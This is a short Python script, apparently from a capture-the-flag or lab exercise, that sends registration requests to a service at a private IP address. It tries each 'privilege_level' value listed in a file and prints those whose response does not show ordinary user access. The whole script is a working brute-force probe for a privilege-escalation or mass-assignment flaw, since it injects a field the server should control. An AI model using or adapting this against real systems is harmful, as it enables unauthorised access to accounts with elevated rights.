import requests

i = 13000

with open('not_mine.txt') as in_file:
    for line in in_file:
        val = int(line.strip())
        data = {
            'first_name': 'fname',
            'last_name': 'lname',
            'medicare': i,
            'password': 'Password1234',
            'privilege_level': val,
        }
        r = requests.post('http://10.66.28.202:8231/register', data)
        if 'Access level: User' not in r.text:
            print(val, i)
        i += 1
